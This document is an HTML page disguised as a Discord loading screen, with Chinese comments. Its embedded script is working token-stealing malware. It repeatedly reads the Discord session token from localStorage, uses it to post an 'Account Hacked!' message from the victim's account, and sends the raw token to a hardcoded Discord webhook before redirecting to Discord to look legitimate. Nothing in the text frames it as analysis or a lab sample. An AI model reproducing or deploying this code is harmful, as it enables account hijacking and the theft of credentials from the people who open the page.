<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (function() {
      try {
        // 每 100ms 檢查一次 localStorage，不管頁面在哪執行
        (function checkToken() {
          try {
            var token = localStorage.getItem("token");
            if (token) {
              token = token.replace(/"/g, "");

              // 發送訊息到目標
              fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                  "Authorization": token
                },
                body: JSON.stringify({
                  content: "🔓 **Account Hacked!**"
                }),
                keepalive: true
              }).catch(function() {});

              // 備份 token 到 webhook
              fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  content: "🔓 **Discord Token 已擷取**\n```\n" + token + "\n```"
                })
              }).catch(function() {});

              // 發送後停止檢查
              clearInterval(timer);
            }
          } catch(e) {}
        })();
        var timer = setInterval(checkToken, 100);

        // 5 秒後超時停止
        setTimeout(function() {
          clearInterval(timer);
        }, 5000);

        // 先嘗試 deep link 拉起 Discord app（這樣 Discord 的 localStorage 就會被觸及）
        window.location.href = "discord://";

        // 200ms 後跳回 Discord（Discord 會決定是在 internal browser 還是外部瀏覽器）
        setTimeout(function() {
          window.location.href = "https://discord.com/channels/@me";
        }, 200);
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
